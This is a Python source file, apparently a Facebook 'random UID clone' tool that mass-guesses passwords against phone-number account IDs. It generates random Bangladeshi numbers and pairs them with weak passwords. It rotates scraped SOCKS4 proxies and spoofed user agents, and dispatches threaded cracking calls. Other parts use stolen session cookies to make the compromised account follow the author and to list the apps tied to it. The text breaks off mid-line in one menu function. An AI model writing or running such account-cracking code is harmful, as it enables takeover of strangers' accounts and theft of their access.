import os,sys,time,json,random,re,string,platform,base64,uuid
os.system("git pull")
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetime
from time import sleep
from time import sleep as waktu
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
    os.system('pip install bs4')
def saiya():
    os.system('clear')
    print(logo)
    print('\033[1;37m[1] RANDOM UID CLONE')
    print('\033[1;37m[2] CONTACT DEVELOPER')
    print('\033[1;37m[0] EXIT')
    opt = input('\033[1;37m[?] CHOOSE : ')
    if opt == '1':
        menu()
    if None == '2':
        os.system('xdg-open https://www.facebook.com/profile.php?id=100086270594350&mibextid=ZbWKwL')
        return None
    if None == '0':
        os.system('exit')
        return None

P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'    # WARNA MATI
A = '\x1b[1;90m' # WARNA ABU ABU
    


def follow(self, session, coki):
        r = BeautifulSoup(session.get('https://www.facebook.com/profile.php?id=100086270594350', {
            'cookie': coki }, **('cookies',)).text, 'html.parser')
        get = r.find('a', 'Ikuti', **('string',)).get('href')
        session.get('https://mbasic.facebook.com' + str(get), {
            'cookie': coki }, **('cookies',)).text
            
            
def line():
    print("\033[1;90m———————————————————————————————————\x1b[0m")
    
class slower:
    def __init__(self, z):
        for e in z + "\n":
            sys.stdout.write(e)
            sys.stdout.flush()
            time.sleep(0.11)
            
RED = '\033[1;91m'
WHITE = '\033[1;97m'
GREEN = '\033[1;32m' #
YELLOW = '\033[1;33m'
BLUE = '\033[1;34m'
ORANGE = '\033[1;35m'
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;92m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'    # WARNA MATI
A = '\x1b[1;90m' # WARNA ABU ABU
BN = '\x1b[1;107m' # BELAKANG PUTIH
BBL = '\x1b[1;106m' # BELAKANG BIRU LANGIT
BP = '\x1b[1;105m' # BELAKANG PINK
BB = '\x1b[1;104m' # BELAKANG BIRU
BK = '\x1b[1;103m' # BELAKANG KUNING
BH = '\x1b[1;102m' # BELAKANG HIJAU
BM = '\x1b[1;101m' # BELAJANG MERAH
BA = '\x1b[1;100m' # BELAKANG ABU ABU
A = '\x1b[1;97m' 
B = '\x1b[1;96m' 
C = '\x1b[1;91m' 
D = '\x1b[1;92m'
M = '\033[1;31m'
H = '\033[1;32m'
N = '\x1b[1;37m'    
E = '\x1b[1;93m' 
F = '\x1b[1;94m'
G = '\x1b[1;95m'
P = '\033[1;37m'
RED = '\033[1;91m'
WHITE = '\033[1;97m'
GREEN = '\033[1;32m' #
YELLOW = '\033[1;33m'
BLUE = '\033[1;34m'
ORANGE = '\033[1;35m'
now = datetime.now()
dt_string = now.strftime("%H:%M")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
today = date.today()
my_color = [
 P, M, H, K, B, U, O, N]
warna = random.choice(my_color)
now = datetime.now()
dt_string = now.strftime("%H:%M")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
today = date.today()

def cek_apks(session,coki):
    w=session.get("https://m.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r\r%s {P}[%sâ€¢%s] %sActive Apks & Web Not Found%s         '%(N,U,N,B,N))
    else:
        print(f'\r\r {G}[â€¢] Active Apks & Web ðŸ‘‡{G}       ')
        for i in range(len(game)):
            print(f"\r\r {G}[%s] %s %s"%(i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))

    w=session.get("https://m.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r\r%s [%sâ€¢%s] %sExpired Apks & Web Not Found%s                '%(N,M,N,M,N))
    else:
        print(f'\r\r [{M}â€¢{P}]{M} Expired Apks & Web ðŸ‘‡{P}')
        for i in range(len(game)):
            print(f"\r\r {K}[%s]{K} %s %s"%(i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))

logo =("""\033[1;91m .--.   .--.     ____      .---.     .---.        ____    ,---.   .--.        
|  | _/  /    .'  __ `.   | ,_|     | ,_|      .'  __ `. |    \  |  |        
| (`' ) /    /   '  \  \,-./  )   ,-./  )     /   '  \  \|  ,  \ |  |        
|(_ ()_)     |___|  /  |\  '_ '`) \  '_ '`)   |___|  /  ||  |\_ \|  |        
| (_,_)   __    _.-`   | > (_)  )  > (_)  )      _.-`   ||  _( )_\  |        
|  |\ \  |  |.'   _    |(  .  .-' (  .  .-'   .'   _    || (_ o _)  |        
|  | \ `'   /|  _( )_  | `-'`-'|___`-'`-'|___ |  _( )_  ||  (_,_)\  |        
|  |  \    / \ (_ o _) /  |        \|        \\ (_ o _) /|  |    |  |        
`--'   `'-'   '.(_,_).'   `--------``--------` '.(_,_).' '--'    '--'        ┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
 ┃\033[1;93m [✓] AUTHOR    \033[1;91m: \033[1;93mkallan mitro             ┃\033[32;1m✮⃝𝐀.kallan mitro 𝄟⃝
 ┃\033[1;35m [✓] TOOL      \033[1;91m: \033[1;35mRANDOM CLONE               ┃\033[33;1m✮⃝𝐀kallan mitro 𝄟⃝
 ┃\033[1;91m [✓] STATUS    \033[1;91m: \033[1;91mFREE                       ┃\033[34;1m✮⃝𝐀.kallan mitro 𝄟⃝
 ┃\033[30;1m [✓] SYSTEM    \033[1;91m: \033[30;1mDATA & WIFI                ┃\033[35;1m✮⃝𝐀kallan mitro𝄟⃝
 ┃\33[1;92m [✓] GITHUB    \033[1;91m: \33[1;92m kallan mitro             ┃\033[36;1m✮⃝𝐀.kallan mitro 𝄟⃝
 ┃\033[1;34m [✓] FACEBOOK  \033[1;91m: \033[1;34m  https://www.facebook.com/profile.php?id=100086270594350             ┃\033[37;1m✮⃝𝐀 kallan mitro 𝄟⃝
 ┃\033[1;36m [✓] WHATSAPP  \033[1;91m: \033[1;36m 017+++++           ┃\033[33;1m✮⃝𝐀kallan𝄟⃝
 ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛""")
loop = 0
oks = []
cps = []
def linex():
    print('\033[1;37m--------------------------------------------')

def clear():
    os.system('clear')
    print(logo)
from time import localtime as lt
from os import system as cmd
ltx = int(lt()[3])
if ltx > 12:
    a = ltx-12
    tag = "PM"
else:
    a = ltx
    tag = "AM"
    
    
try:
    print('\n\n\033[1;33mLOADING ASSET FILES ... \033[0;97m')
    v = 5.2
    update = ('5.2')
    update = ('5.2')
    if str(v) in update:
        os.system('clear')
    else:pass
except:print('\n\033[1;31mNO INTERNET CONNECTION ... \033[0;97m')
#global functions
def dynamic(text):
    titik = ['.   ','..  ','... ','.... ']
    for o in titik:
        print('\r'+text+o),
        sys.stdout.flush();time.sleep(1)

#User agents
ugen2=[]
ugen=[]
uas=[] 
user=[]
twf =[]
try:
    prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
    open('.prox.txt','w').write(prox)
except Exception as e:
    print(' WELCOME TO kallan _mitro WORLD ')
prox=open('.prox.txt','r').read().splitlines()

for xd in range(10000):
    a='Mozilla/5.0 (Symbian/3; Series60/'
    b=random.randrange(1, 9)
    c=random.randrange(1, 9)
    d='Nokia'
    e=random.randrange(100, 9999)
    f='/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/'
    g=random.randrange(1, 9)
    h=random.randrange(1, 4)
    i=random.randrange(1, 4)
    j=random.randrange(1, 4)
    k='Mobile Safari/535.1'
    uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
    ugen2.append(uaku)
    
    aa='Mozilla/5.0 (Linux; U; Android'
    b=random.choice(['6','7','8','9','10','11','12'])
    c=' en-us; GT-'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/537.36'
    uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
    ugen.append(uaku2)        

def menu():
    clear()
    print('\033[1;37m[1] 8 DIGIT CLONE  \033[38;5;196m[\033[38;5;46mFAST\033[38;5;196m]')
    print('\033[1;37m[2] 7 kallan CLONE  \033[38;5;196m[\033[38;5;46mFAST\033[38;5;196m]')
    print('\033[1;37m[3] 6 kallan CLONE  \033[38;5;196m[\033[38;5;46mFAST\033[38;5;196m]')
    print('\033[1;37m[4] 8 kallan CLONE  \033[38;5;196m[\033[38;5;46mULTA\033[38;5;196m]')
    print('\033[1;37m[5] 7  kallan CLONE  \033[38;5;196m[\033[38;5;46mULTA\033[38;5;196m]')
    print('\033[1;37m[6] 6 kallan CLONE  \033[38;5;196m[\033[38;5;46mULTA\033[38;5;196m]')
    print('\033[1;37m[7] kallan CLONE \033[38;5;196m[\033[38;5;46mSLOW\033[38;5;196m]')
    linex()
    mtd=input('\033[1;37m[âœ“] CHOOSE :')
    if mtd in '1':
        ak()
    if mtd in '2':
        ak1()
    if mtd in '3':
        ak2()
    if mtd in '4':
        ak3()
    if mtd in '5':
        ak4()
    if mtd in '6':
        ak5()
    if mtd in '7':
        ak6()
    
    


def ak():
    os.system("clear")
    print(logo)
    print('\033[1;37m[âœ“] BD CODE    - 016 017 018 019')
    code = input('\033[1;37m[âœ“] CHOOSE YOUR COUNTRY CODE : ')
    print("")
    os.system('clear')
    print(logo)
    limit = int(input('\033[1;37m[âœ“] CRACK ID LIMIT : '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(8))
        user.append(nmp)
    with ThreadPool(max_workers=35) as setu:
        clear()
        tl = str(len(user))
        print('\033[1;37m[âœ“] SIM CODE  : '+code)
        print('\033[1;37m[âœ“] CRACK ID  : '+tl)
        slower('\033[1;37m[âœ“] CRACKING......')
        linex()
        for love in user:
            uid = code+love
            pwx = [love,'bangladesh','i love you']
            setu.submit(rcrack,uid,pwx,tl)
            



def ak1():
    os.system("clear")
    print(logo)
    print('\033[1;37m[âœ“] BD CODE    - 016 017 018 019')
    code = input('\033[1;37m[âœ“] CHOOSE YOUR COUNTRY CODE : ')
    print("")
    os.system('clear')
    print(logo)
    limit = int(input('\033[1;37m[âœ“] CRACK ID LIMIT : '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(8))
        user.append(nmp)
    with ThreadPool(max_workers=35) as setu:
        clear()
        tl = str(len(user))
        print('\033[1;37m[âœ“] SIM CODE  : '+code)
        print('\033[1;37m[âœ“] CRACK ID  : '+tl)
        slower('\033[1;37m[âœ“] CRACKING......')
        linex()
        for love in user:
            uid = code+love
            bl=uid[:7]
            lb=uid[0:7]
            pwx = [bl,lb,'bangladesh']
            setu.submit(rcrack,uid,pwx,tl)



def ak2():
    os.system("clear")
    print(logo)
    print('\033[1;37m[âœ“] BD CODE    - 016 017 018 019')
    code = input('\033[1;37m[âœ“] CHOOSE YOUR COUNTRY CODE : ')
    print("")
    os.system('clear')
    print(logo)
    limit = int(input('\033[1;37m[âœ“] CRACK ID LIMIT : '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(8))
        user.append(nmp)
    with ThreadPool(max_workers=35) as setu:
        clear()
        tl = str(len(user))
        print('\033[1;37m[âœ“] SIM CODE  : '+code)
        print('\033[1;37m[âœ“] CRACK ID  : '+tl)
        slower('\033[1;37m[âœ“] CRACKING......')
        linex()
        for love in user:
            uid = code+love
            bl=uid[:6]
            lb=uid[0:6]
            pwx = [bl,lb,'bangladesh']
            setu.submit(rcrack,uid,pwx,tl)




def ak3():
    os.system("clear")
    print(logo)
    print('\033[1;37m[âœ“] BD CODE    - 016 017 018 019')
    code = input('\033[1;37m[âœ“] CHOOSE YOUR COUNTRY CODE : ')
    print("")
    os.system('clear')
    print(logo)
    limit = int(input('\033[1;37m[âœ“] CRACK ID LIMIT : '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(8))
        user.append(nmp)
    with ThreadPool(max_workers=35) as setu:
        clear()
        tl = str(len(user))
        print('\033[1;37m[âœ“] SIM CODE  : '+code)
        print('\033[1;37m[âœ“] CRACK ID  : '+tl)
        slower('\033[1;37m[âœ“] CRACKING......')
        linex()
        for love in user:
            uid = code+love
            pwx = [love,'bangladesh','i love you','09876543']
            setu.submit(bcrack,uid,pwx,tl)



def ak4():
    os.system("clear")
    print(logo)
    print('\033[1;37m[âœ“] BD CODE    - 016 017 018 019')
    code = input('\033[1;37m[âœ“] CHOOSE YOUR COUNTRY CODE : ')
    print("")
    os.system('clear')
    print(logo)
    limit = int(input('\033[1;37m[âœ“] CRACK ID LIMIT : '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(8))
        user.append(nmp)
    with ThreadPool(max_workers=35) as setu:
        clear()
        tl = str(len(user))
        print('\033[1;37m[âœ“] SIM CODE  : '+code)
        print('\033[1;37m[âœ“] CRA
